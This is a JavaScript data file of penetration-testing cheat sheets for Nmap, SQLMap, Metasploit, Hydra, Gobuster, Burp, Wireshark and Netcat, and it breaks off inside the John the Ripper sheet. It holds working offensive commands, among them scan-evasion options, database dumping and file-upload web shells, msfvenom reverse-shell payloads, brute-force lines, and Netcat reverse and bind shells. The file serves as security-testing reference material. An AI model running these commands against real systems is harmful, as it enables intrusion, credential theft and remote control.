/**
 * cheatsheets.js -- Comprehensive Penetration Testing Cheat Sheet Database
 *
 * Copyright (c) 2026 DarkNode Project
 * Author: SpartanKing18
 * License: MIT
 *
 * This file contains 30 cheat sheets covering offensive security,
 * defensive analysis, scripting, and cloud security topics.
 * All commands are real, working references for professional use.
 *
 * DISCLAIMER: These commands are provided for authorized security
 * testing and educational purposes only. Unauthorized access to
 * computer systems is illegal. Always obtain proper authorization
 * before conducting any security assessments.
 */

export const CHEATSHEETS = [

  // ---------------------------------------------------------------
  // 1. Nmap  (30 commands)
  // ---------------------------------------------------------------
  {
    cat: "Scanning",
    title: "Nmap",
    items: [
      {
        cmd: "nmap -sn 192.168.1.0/24",
        desc: "Ping sweep -- discover live hosts without port scanning",
        example: "nmap -sn 10.10.10.0/24",
      },
      {
        cmd: "nmap -sS -T4 <target>",
        desc: "SYN stealth scan with aggressive timing",
        example: "nmap -sS -T4 10.10.10.5",
      },
      {
        cmd: "nmap -sT <target>",
        desc: "TCP connect scan (full three-way handshake)",
        example: "nmap -sT 192.168.1.100",
      },
      {
        cmd: "nmap -sU <target>",
        desc: "UDP scan for common UDP services",
        example: "nmap -sU --top-ports 100 10.10.10.5",
      },
      {
        cmd: "nmap -sV <target>",
        desc: "Service version detection on open ports",
        example: "nmap -sV -p 22,80,443 10.10.10.5",
      },
      {
        cmd: "nmap -O <target>",
        desc: "OS detection using TCP/IP fingerprinting",
        example: "nmap -O --osscan-guess 10.10.10.5",
      },
      {
        cmd: "nmap -A <target>",
        desc: "Aggressive scan: OS, version, scripts, traceroute",
        example: "nmap -A -T4 10.10.10.5",
      },
      {
        cmd: "nmap -p- <target>",
        desc: "Scan all 65535 TCP ports",
        example: "nmap -p- --min-rate 5000 10.10.10.5",
      },
      {
        cmd: "nmap -p 1-1000 <target>",
        desc: "Scan a specific port range",
        example: "nmap -p 1-1000 192.168.1.1",
      },
      {
        cmd: "nmap --top-ports 20 <target>",
        desc: "Scan the 20 most common ports",
        example: "nmap --top-ports 20 10.10.10.5",
      },
      {
        cmd: "nmap -sC <target>",
        desc: "Run default NSE scripts against open ports",
        example: "nmap -sC -sV 10.10.10.5",
      },
      {
        cmd: "nmap --script=vuln <target>",
        desc: "Run all vulnerability detection scripts",
        example: "nmap --script=vuln -p 80,443 10.10.10.5",
      },
      {
        cmd: "nmap --script=http-enum <target>",
        desc: "Enumerate web directories and files via NSE",
        example: "nmap --script=http-enum -p 80 10.10.10.5",
      },
      {
        cmd: "nmap --script=smb-vuln* <target>",
        desc: "Check for known SMB vulnerabilities (EternalBlue, etc.)",
        example: "nmap --script=smb-vuln* -p 445 10.10.10.5",
      },
      {
        cmd: "nmap -sS -sV -sC -oA scan_output <target>",
        desc: "Full scan with all output formats (normal, XML, grepable)",
        example: "nmap -sS -sV -sC -oA full_scan 10.10.10.5",
      },
      {
        cmd: "nmap -oN output.txt <target>",
        desc: "Save scan results in normal text format",
        example: "nmap -sV -oN results.txt 10.10.10.5",
      },
      {
        cmd: "nmap -oX output.xml <target>",
        desc: "Save scan results in XML format for parsing",
        example: "nmap -sV -oX results.xml 10.10.10.5",
      },
      {
        cmd: "nmap -Pn <target>",
        desc: "Skip host discovery -- treat all hosts as online",
        example: "nmap -Pn -sV 10.10.10.5",
      },
      {
        cmd: "nmap -f <target>",
        desc: "Fragment packets to bypass simple firewalls/IDS",
        example: "nmap -f -sS 10.10.10.5",
      },
      {
        cmd: "nmap --mtu 24 <target>",
        desc: "Set custom MTU size for packet fragmentation",
        example: "nmap --mtu 24 -sS 10.10.10.5",
      },
      {
        cmd: "nmap -D RND:10 <target>",
        desc: "Use 10 random decoy IPs to mask scan origin",
        example: "nmap -D RND:10 -sS 10.10.10.5",
      },
      {
        cmd: "nmap -S <spoofed_ip> -e eth0 <target>",
        desc: "Spoof source IP address (requires raw socket access)",
        example: "nmap -S 192.168.1.200 -e eth0 10.10.10.5",
      },
      {
        cmd: "nmap --source-port 53 <target>",
        desc: "Use a specific source port (e.g. DNS) to bypass filters",
        example: "nmap --source-port 53 -sS 10.10.10.5",
      },
      {
        cmd: "nmap --script=dns-brute <domain>",
        desc: "Brute-force DNS subdomains using NSE",
        example: "nmap --script=dns-brute example.com",
      },
      {
        cmd: "nmap --script=ftp-anon <target>",
        desc: "Check for anonymous FTP login",
        example: "nmap --script=ftp-anon -p 21 10.10.10.5",
      },
      {
        cmd: "nmap --script=ssh-brute <target>",
        desc: "Brute-force SSH credentials via NSE",
        example: "nmap --script=ssh-brute -p 22 10.10.10.5",
      },
      {
        cmd: "nmap -6 <target>",
        desc: "Scan an IPv6 target",
        example: "nmap -6 fe80::1",
      },
      {
        cmd: "nmap --script=ssl-heartbleed <target>",
        desc: "Test for Heartbleed vulnerability in SSL/TLS",
        example: "nmap --script=ssl-heartbleed -p 443 10.10.10.5",
      },
      {
        cmd: "nmap --min-rate 10000 -p- <target>",
        desc: "Ultra-fast full port scan with minimum packet rate",
        example: "nmap --min-rate 10000 -p- 10.10.10.5",
      },
      {
        cmd: "nmap -iL targets.txt",
        desc: "Read targets from a file (one per line)",
        example: "nmap -sV -iL hosts.txt",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 2. SQLMap  (25 commands)
  // ---------------------------------------------------------------
  {
    cat: "Web Exploitation",
    title: "SQLMap",
    items: [
      {
        cmd: "sqlmap -u 'http://target/page?id=1'",
        desc: "Test a GET parameter for SQL injection",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1'",
      },
      {
        cmd: "sqlmap -u '<url>' --dbs",
        desc: "Enumerate all databases on the target",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --dbs",
      },
      {
        cmd: "sqlmap -u '<url>' -D <db> --tables",
        desc: "List all tables in a specific database",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' -D mydb --tables",
      },
      {
        cmd: "sqlmap -u '<url>' -D <db> -T <tbl> --columns",
        desc: "List columns of a specific table",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' -D mydb -T users --columns",
      },
      {
        cmd: "sqlmap -u '<url>' -D <db> -T <tbl> --dump",
        desc: "Dump all rows from a specific table",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' -D mydb -T users --dump",
      },
      {
        cmd: "sqlmap -u '<url>' --dump-all",
        desc: "Dump all data from all databases",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --dump-all",
      },
      {
        cmd: "sqlmap -u '<url>' --os-shell",
        desc: "Attempt to get an interactive OS shell via SQL injection",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --os-shell",
      },
      {
        cmd: "sqlmap -u '<url>' --os-cmd='whoami'",
        desc: "Execute a single OS command via SQL injection",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --os-cmd='id'",
      },
      {
        cmd: "sqlmap -r request.txt",
        desc: "Test injection using a saved HTTP request file (from Burp)",
        example: "sqlmap -r login.req --batch",
      },
      {
        cmd: "sqlmap -u '<url>' --cookie='PHPSESSID=abc123'",
        desc: "Provide session cookies for authenticated scanning",
        example: "sqlmap -u 'http://10.10.10.5/dash?id=1' --cookie='sess=xyz'",
      },
      {
        cmd: "sqlmap -u '<url>' --level=5 --risk=3",
        desc: "Maximum detection level and risk (most thorough)",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --level=5 --risk=3",
      },
      {
        cmd: "sqlmap -u '<url>' --technique=BEUSTQ",
        desc: "Test all SQL injection techniques",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --technique=BEUSTQ",
      },
      {
        cmd: "sqlmap -u '<url>' --tamper=space2comment",
        desc: "Use a tamper script to bypass WAF/filters",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --tamper=space2comment,between",
      },
      {
        cmd: "sqlmap -u '<url>' --batch",
        desc: "Run non-interactively using default answers",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --batch --dbs",
      },
      {
        cmd: "sqlmap -u '<url>' --threads=10",
        desc: "Set the number of concurrent threads",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --threads=10 --dump",
      },
      {
        cmd: "sqlmap -u '<url>' --proxy='http://127.0.0.1:8080'",
        desc: "Route traffic through a proxy (e.g. Burp Suite)",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --proxy='http://127.0.0.1:8080'",
      },
      {
        cmd: "sqlmap -u '<url>' --random-agent",
        desc: "Use a random HTTP User-Agent header",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --random-agent",
      },
      {
        cmd: "sqlmap -u '<url>' --current-user",
        desc: "Retrieve the current database user",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --current-user",
      },
      {
        cmd: "sqlmap -u '<url>' --current-db",
        desc: "Retrieve the current database name",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --current-db",
      },
      {
        cmd: "sqlmap -u '<url>' --is-dba",
        desc: "Check if the current user has DBA privileges",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --is-dba",
      },
      {
        cmd: "sqlmap -u '<url>' --passwords",
        desc: "Dump database user password hashes",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --passwords",
      },
      {
        cmd: "sqlmap -u '<url>' --file-read='/etc/passwd'",
        desc: "Read a file from the server filesystem",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --file-read='/etc/passwd'",
      },
      {
        cmd: "sqlmap -u '<url>' --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
        desc: "Upload a file to the server filesystem",
        example: "sqlmap -u 'http://10.10.10.5/item?id=1' --file-write='cmd.php' --file-dest='/var/www/html/cmd.php'",
      },
      {
        cmd: "sqlmap -u '<url>' --forms",
        desc: "Automatically test forms on the target page",
        example: "sqlmap -u 'http://10.10.10.5/login' --forms --batch",
      },
      {
        cmd: "sqlmap -u '<url>' --crawl=3",
        desc: "Crawl the target website to depth 3 looking for injection points",
        example: "sqlmap -u 'http://10.10.10.5/' --crawl=3 --batch",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 3. Metasploit  (30 commands)
  // ---------------------------------------------------------------
  {
    cat: "Exploitation",
    title: "Metasploit",
    items: [
      {
        cmd: "msfconsole",
        desc: "Launch the Metasploit Framework console",
      },
      {
        cmd: "msfdb init",
        desc: "Initialize the Metasploit database (PostgreSQL)",
      },
      {
        cmd: "search type:exploit platform:windows smb",
        desc: "Search for Windows SMB exploits in the module database",
      },
      {
        cmd: "search cve:2021-44228",
        desc: "Search for modules by CVE identifier",
        example: "search cve:2017-0144",
      },
      {
        cmd: "use exploit/windows/smb/ms17_010_eternalblue",
        desc: "Select the EternalBlue exploit module",
      },
      {
        cmd: "show options",
        desc: "Display configurable options for the current module",
      },
      {
        cmd: "set RHOSTS <target>",
        desc: "Set the remote target host",
        example: "set RHOSTS 10.10.10.5",
      },
      {
        cmd: "set LHOST <ip>",
        desc: "Set the local (attacker) IP for reverse connections",
        example: "set LHOST 10.10.14.5",
      },
      {
        cmd: "set LPORT <port>",
        desc: "Set the local listening port for the payload",
        example: "set LPORT 4444",
      },
      {
        cmd: "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        desc: "Set a 64-bit Windows Meterpreter reverse TCP payload",
      },
      {
        cmd: "exploit",
        desc: "Launch the exploit against the configured target",
      },
      {
        cmd: "run",
        desc: "Alias for exploit -- launch the current module",
      },
      {
        cmd: "background",
        desc: "Background the current Meterpreter session",
      },
      {
        cmd: "sessions -l",
        desc: "List all active sessions",
      },
      {
        cmd: "sessions -i <id>",
        desc: "Interact with a specific session by ID",
        example: "sessions -i 1",
      },
      {
        cmd: "use auxiliary/scanner/portscan/tcp",
        desc: "Use the TCP port scanner auxiliary module",
      },
      {
        cmd: "use auxiliary/scanner/smb/smb_version",
        desc: "Detect SMB version on target hosts",
      },
      {
        cmd: "use post/multi/recon/local_exploit_suggester",
        desc: "Suggest local privilege escalation exploits for a session",
      },
      {
        cmd: "use post/windows/gather/hashdump",
        desc: "Dump password hashes from a Windows session",
      },
      {
        cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe",
        desc: "Generate a Windows Meterpreter reverse shell executable",
        example: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe",
      },
      {
        cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf",
        desc: "Generate a Linux reverse shell ELF binary",
        example: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf",
      },
      {
        cmd: "msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php",
        desc: "Generate a PHP Meterpreter reverse shell payload",
      },
      {
        cmd: "use exploit/multi/handler",
        desc: "Set up a multi-handler listener for incoming shells",
      },
      {
        cmd: "db_nmap -sV -sC <target>",
        desc: "Run Nmap from within Metasploit and store results in the database",
        example: "db_nmap -sV -sC 10.10.10.0/24",
      },
      {
        cmd: "hosts",
        desc: "List all hosts discovered and stored in the database",
      },
      {
        cmd: "services",
        desc: "List all services found across discovered hosts",
      },
      {
        cmd: "vulns",
        desc: "List all vulnerabilities found in the database",
      },
      {
        cmd: "creds",
        desc: "List all credentials gathered during the engagement",
      },
      {
        cmd: "route add <subnet> <netmask> <session>",
        desc: "Add a route through a Meterpreter session for pivoting",
        example: "route add 172.16.0.0 255.255.0.0 1",
      },
      {
        cmd: "spool /tmp/msf_output.txt",
        desc: "Log all console output to a file",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 4. Hydra  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Brute Force",
    title: "Hydra",
    items: [
      {
        cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>",
        desc: "Brute-force SSH with a single username and wordlist",
        example: "hydra -l admin -P rockyou.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -L users.txt -P passwords.txt ssh://<target>",
        desc: "Brute-force SSH with username and password lists",
        example: "hydra -L users.txt -P pass.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt ftp://<target>",
        desc: "Brute-force FTP login credentials",
        example: "hydra -l admin -P rockyou.txt ftp://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt <target> http-get /admin",
        desc: "Brute-force HTTP Basic Auth on a specific path",
        example: "hydra -l admin -P rockyou.txt 10.10.10.5 http-get /admin",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'",
        desc: "Brute-force an HTTP POST login form",
        example: "hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'",
      },
      {
        cmd: "hydra -l sa -P rockyou.txt <target> mssql",
        desc: "Brute-force Microsoft SQL Server authentication",
        example: "hydra -l sa -P rockyou.txt 10.10.10.5 mssql",
      },
      {
        cmd: "hydra -l root -P rockyou.txt <target> mysql",
        desc: "Brute-force MySQL authentication",
        example: "hydra -l root -P rockyou.txt 10.10.10.5 mysql",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt rdp://<target>",
        desc: "Brute-force Remote Desktop Protocol login",
        example: "hydra -l admin -P rockyou.txt rdp://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt smb://<target>",
        desc: "Brute-force SMB/CIFS login credentials",
        example: "hydra -l admin -P rockyou.txt smb://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt <target> vnc",
        desc: "Brute-force VNC authentication",
        example: "hydra -l admin -P rockyou.txt 10.10.10.5 vnc",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt smtp://<target>",
        desc: "Brute-force SMTP login credentials",
        example: "hydra -l admin -P rockyou.txt smtp://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt pop3://<target>",
        desc: "Brute-force POP3 email credentials",
        example: "hydra -l admin -P rockyou.txt pop3://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt imap://<target>",
        desc: "Brute-force IMAP email credentials",
        example: "hydra -l admin -P rockyou.txt imap://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt telnet://<target>",
        desc: "Brute-force Telnet login credentials",
        example: "hydra -l admin -P rockyou.txt telnet://10.10.10.5",
      },
      {
        cmd: "hydra -t 4 -l admin -P rockyou.txt ssh://<target>",
        desc: "Limit to 4 parallel connections (safer for SSH)",
        example: "hydra -t 4 -l admin -P rockyou.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -V -l admin -P rockyou.txt ssh://<target>",
        desc: "Verbose mode -- show each login attempt",
        example: "hydra -V -l admin -P rockyou.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -e nsr -l admin -P rockyou.txt ssh://<target>",
        desc: "Also try null password, same-as-login, and reversed login",
        example: "hydra -e nsr -l admin -P rockyou.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -o results.txt -l admin -P rockyou.txt ssh://<target>",
        desc: "Write found credentials to an output file",
        example: "hydra -o found.txt -l admin -P rockyou.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -s 2222 -l admin -P rockyou.txt ssh://<target>",
        desc: "Specify a non-standard port for the service",
        example: "hydra -s 2222 -l admin -P rockyou.txt ssh://10.10.10.5",
      },
      {
        cmd: "hydra -l admin -P rockyou.txt <target> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect'",
        desc: "Brute-force WordPress login page",
        example: "hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect'",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 5. Gobuster / Dirb  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Web Enumeration",
    title: "Gobuster / Dirb",
    items: [
      {
        cmd: "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt",
        desc: "Directory brute-force with common wordlist",
        example: "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt",
      },
      {
        cmd: "gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
        desc: "Directory brute-force with SecLists raft-medium wordlist",
        example: "gobuster dir -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -x php,html,txt",
        desc: "Search for files with specific extensions",
        example: "gobuster dir -u http://10.10.10.5 -w wordlist.txt -x php,html,txt,bak",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -t 50",
        desc: "Use 50 concurrent threads for faster scanning",
        example: "gobuster dir -u http://10.10.10.5 -w wordlist.txt -t 50",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -s '200,204,301,302,307'",
        desc: "Only show responses with specific status codes",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -b '404,403'",
        desc: "Exclude specific status codes from results",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -o output.txt",
        desc: "Save results to an output file",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -c 'session=abc123'",
        desc: "Include a cookie header for authenticated scanning",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -H 'Authorization: Bearer <token>'",
        desc: "Include a custom header for authenticated scanning",
      },
      {
        cmd: "gobuster dir -u http://<target> -w wordlist.txt -k",
        desc: "Skip TLS/SSL certificate verification",
      },
      {
        cmd: "gobuster dns -d <domain> -w subdomains.txt",
        desc: "DNS subdomain brute-force enumeration",
        example: "gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
      },
      {
        cmd: "gobuster dns -d <domain> -w subdomains.txt -i",
        desc: "Show IP addresses in DNS enumeration results",
      },
      {
        cmd: "gobuster vhost -u http://<target> -w vhosts.txt",
        desc: "Virtual host brute-force enumeration",
        example: "gobuster vhost -u http://10.10.10.5 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
      },
      {
        cmd: "gobuster fuzz -u http://<target>/FUZZ -w wordlist.txt",
        desc: "Fuzz a URL path with the FUZZ keyword",
      },
      {
        cmd: "dirb http://<target>",
        desc: "Run dirb with default wordlist for directory enumeration",
        example: "dirb http://10.10.10.5",
      },
      {
        cmd: "dirb http://<target> /usr/share/wordlists/dirb/big.txt",
        desc: "Run dirb with the big wordlist",
        example: "dirb http://10.10.10.5 /usr/share/wordlists/dirb/big.txt",
      },
      {
        cmd: "dirb http://<target> -a 'Mozilla/5.0'",
        desc: "Set a custom User-Agent string for dirb",
        example: "dirb http://10.10.10.5 -a 'Mozilla/5.0'",
      },
      {
        cmd: "dirb http://<target> -p http://127.0.0.1:8080",
        desc: "Route dirb traffic through a proxy",
        example: "dirb http://10.10.10.5 -p http://127.0.0.1:8080",
      },
      {
        cmd: "dirb http://<target> -c 'PHPSESSID=abc123'",
        desc: "Provide a cookie value for authenticated dirb scanning",
      },
      {
        cmd: "feroxbuster -u http://<target> -w wordlist.txt -x php,html --depth 3",
        desc: "Recursive content discovery with feroxbuster",
        example: "feroxbuster -u http://10.10.10.5 -w wordlist.txt -x php --depth 3",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 6. Burp Suite  (20 tips)
  // ---------------------------------------------------------------
  {
    cat: "Web Exploitation",
    title: "Burp Suite",
    items: [
      {
        cmd: "Proxy > Intercept > Forward/Drop",
        desc: "Intercept HTTP requests and selectively forward or drop them",
      },
      {
        cmd: "Proxy > HTTP History > Send to Repeater",
        desc: "Send a captured request to Repeater for manual testing",
      },
      {
        cmd: "Proxy > Options > Add listener on 127.0.0.1:8080",
        desc: "Configure the proxy listener address and port",
      },
      {
        cmd: "Repeater > Modify request > Send",
        desc: "Manually modify and resend individual HTTP requests",
      },
      {
        cmd: "Intruder > Positions > Add payload markers",
        desc: "Mark injection points in a request for automated attacks",
      },
      {
        cmd: "Intruder > Payloads > Load wordlist",
        desc: "Load a payload wordlist for Intruder attacks",
      },
      {
        cmd: "Intruder > Attack type: Sniper",
        desc: "Test one payload position at a time with all payloads",
      },
      {
        cmd: "Intruder > Attack type: Cluster Bomb",
        desc: "Test all combinations of payloads across positions",
      },
      {
        cmd: "Intruder > Attack type: Battering Ram",
        desc: "Use the same payload in all positions simultaneously",
      },
      {
        cmd: "Intruder > Attack type: Pitchfork",
        desc: "Use parallel payload lists (one per position, iterated together)",
      },
      {
        cmd: "Scanner > Active Scan",
        desc: "Actively probe the target for vulnerabilities (Pro feature)",
      },
      {
        cmd: "Scanner > Passive Scan",
        desc: "Analyze proxied traffic for issues without sending extra requests",
      },
      {
        cmd: "Decoder > Encode/Decode (Base64, URL, HTML)",
        desc: "Encode and decode strings in various formats",
      },
      {
        cmd: "Comparer > Compare two responses",
        desc: "Diff two HTTP responses side by side to spot differences",
      },
      {
        cmd: "Sequencer > Token analysis",
        desc: "Analyze randomness quality of session tokens or CSRF tokens",
      },
      {
        cmd: "Extender > BApp Store > Install extensions",
        desc: "Install community extensions like Logger++, Autorize, etc.",
      },
      {
        cmd: "Target > Scope > Add target to scope",
        desc: "Define which hosts are in scope to filter proxy traffic",
      },
      {
        cmd: "Target > Site map > Spider",
        desc: "Crawl the target website to discover content and endpoints",
      },
      {
        cmd: "Project options > Connections > SOCKS proxy",
        desc: "Route Burp traffic through a SOCKS proxy for pivoting",
      },
      {
        cmd: "User options > SSL > Import CA certificate",
        desc: "Install Burp CA certificate for intercepting HTTPS traffic",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 7. Wireshark Filters  (25 filters)
  // ---------------------------------------------------------------
  {
    cat: "Network Analysis",
    title: "Wireshark Filters",
    items: [
      {
        cmd: "ip.addr == 10.10.10.5",
        desc: "Show all traffic to or from a specific IP address",
      },
      {
        cmd: "ip.src == 10.10.10.5",
        desc: "Show traffic originating from a specific IP",
      },
      {
        cmd: "ip.dst == 10.10.10.5",
        desc: "Show traffic destined for a specific IP",
      },
      {
        cmd: "tcp.port == 80",
        desc: "Show all TCP traffic on port 80 (HTTP)",
      },
      {
        cmd: "tcp.port == 443",
        desc: "Show all TCP traffic on port 443 (HTTPS)",
      },
      {
        cmd: "udp.port == 53",
        desc: "Show all UDP traffic on port 53 (DNS)",
      },
      {
        cmd: "tcp.flags.syn == 1 && tcp.flags.ack == 0",
        desc: "Show only SYN packets (connection initiations)",
      },
      {
        cmd: "tcp.flags.reset == 1",
        desc: "Show TCP RST packets (connection resets)",
      },
      {
        cmd: "http",
        desc: "Show all HTTP traffic",
      },
      {
        cmd: "http.request.method == \"GET\"",
        desc: "Show only HTTP GET requests",
      },
      {
        cmd: "http.request.method == \"POST\"",
        desc: "Show only HTTP POST requests",
      },
      {
        cmd: "http.response.code == 200",
        desc: "Show HTTP 200 OK responses",
      },
      {
        cmd: "http.response.code >= 400",
        desc: "Show HTTP error responses (4xx and 5xx)",
      },
      {
        cmd: "dns",
        desc: "Show all DNS query and response traffic",
      },
      {
        cmd: "dns.qry.name contains \"example\"",
        desc: "Show DNS queries containing a specific domain string",
      },
      {
        cmd: "ftp",
        desc: "Show all FTP control channel traffic",
      },
      {
        cmd: "ftp-data",
        desc: "Show FTP data transfer traffic",
      },
      {
        cmd: "smtp",
        desc: "Show all SMTP email traffic",
      },
      {
        cmd: "icmp",
        desc: "Show all ICMP traffic (ping, traceroute)",
      },
      {
        cmd: "arp",
        desc: "Show all ARP traffic (useful for ARP spoofing detection)",
      },
      {
        cmd: "tcp contains \"password\"",
        desc: "Search for the string 'password' in TCP payloads",
      },
      {
        cmd: "frame contains \"login\"",
        desc: "Search for 'login' string across all frame data",
      },
      {
        cmd: "!(ip.addr == 10.10.10.1)",
        desc: "Exclude all traffic from/to a specific IP",
      },
      {
        cmd: "tcp.analysis.retransmission",
        desc: "Show TCP retransmissions (network issues)",
      },
      {
        cmd: "tls.handshake.type == 1",
        desc: "Show TLS Client Hello packets (connection initiation)",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 8. Netcat  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Networking",
    title: "Netcat",
    items: [
      {
        cmd: "nc -lvnp 4444",
        desc: "Start a TCP listener on port 4444 (catch reverse shells)",
      },
      {
        cmd: "nc <target> 80",
        desc: "Connect to a remote host on port 80",
        example: "nc 10.10.10.5 80",
      },
      {
        cmd: "nc -zv <target> 1-1000",
        desc: "TCP port scan a range (verbose, no data transfer)",
        example: "nc -zv 10.10.10.5 1-1000",
      },
      {
        cmd: "nc -zvu <target> 1-1000",
        desc: "UDP port scan a range",
        example: "nc -zvu 10.10.10.5 53",
      },
      {
        cmd: "nc -e /bin/bash <attacker> 4444",
        desc: "Reverse shell -- connect back and spawn bash (classic nc)",
        example: "nc -e /bin/bash 10.10.14.5 4444",
      },
      {
        cmd: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 4444 > /tmp/f",
        desc: "Reverse shell using named pipe (works with nc that lacks -e)",
      },
      {
        cmd: "nc -lvnp 4444 -e /bin/bash",
        desc: "Bind shell -- listen and provide bash to anyone who connects",
      },
      {
        cmd: "nc -lvnp 9999 > received_file.txt",
        desc: "Receive a file over the network (listener side)",
      },
      {
        cmd: "nc <target> 9999 < file_to_send.txt",
        desc: "Send a file over the network to a listener",
      },
      {
        cmd: "nc -lvnp 4444 | tee session.log",
        desc: "Listen and log all received data to a file",
      },
      {
        cmd: "echo 'GET / HTTP/1.1\\r\\nHost: <target>\\r\\n\\r\\n' | nc <target> 80",
        desc: "Manually send an HTTP GET request via netcat",
      },
      {
        cmd: "nc -w 3 <target> 80",
        desc: "Connect with a 3-second timeout",
      },
      {
        cmd: "ncat --ssl <target> 443",
        desc: "Connect to an SSL/TLS service using ncat",
        example: "ncat --ssl 10.10.10.5 443",
      },
      {
        cmd: "ncat --ssl -lvnp 4444",
        desc: "Start an encrypted listener using ncat with SSL",
      },
      {
        cmd: "nc -k -lvnp 4444",
        desc: "Keep listening after a client disconnects (persistent listener)",
      },
      {
        cmd: "nc -u <target> 53",
        desc: "Connect via UDP instead of TCP",
        example: "nc -u 10.10.10.5 53",
      },
      {
        cmd: "ncat --allow 10.10.14.5 -lvnp 4444 -e /bin/bash",
        desc: "Bind shell that only accepts connections from a specific IP",
      },
      {
        cmd: "cat backup.tar.gz | nc <target> 9999",
        desc: "Stream a compressed archive to a remote listener",
      },
      {
        cmd: "nc -lvnp 9999 | tar xzf -",
        desc: "Receive and extract a compressed archive from a sender",
      },
      {
        cmd: "while true; do nc -lvnp 4444 -e /bin/bash; done",
        desc: "Persistent bind shell that respawns after disconnect",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 9. John the Ripper  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Password Cracking",
    title: "John the Ripper",
    items: [
      {
        cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        desc: "Crack hashes using rockyou wordlist",
      },
      {
        cmd: "john --format=raw-md5 --wordlist=rockyou.txt hashes.txt",
        desc: "Crack raw MD5 hashes with a wordlist",
      },
      {
        cmd: "john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt",
        desc: "Crack raw SHA-256 hashes with a wordlist",
      },
      {
        cmd: "john --format=bcrypt --wordlist=rockyou.txt hashes.txt",
        desc: "Crack bcrypt hashes (slow by design)",
      },
      {
        cmd: "john --format=nt --wordlist=rockyou.txt hashes.txt",
        desc: "Crack NTLM hashes (Windows passwords)",
      },
      {
        cmd: "john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt",
        desc: "Crack NTLMv2 hashes captured from the network",
      },
      {
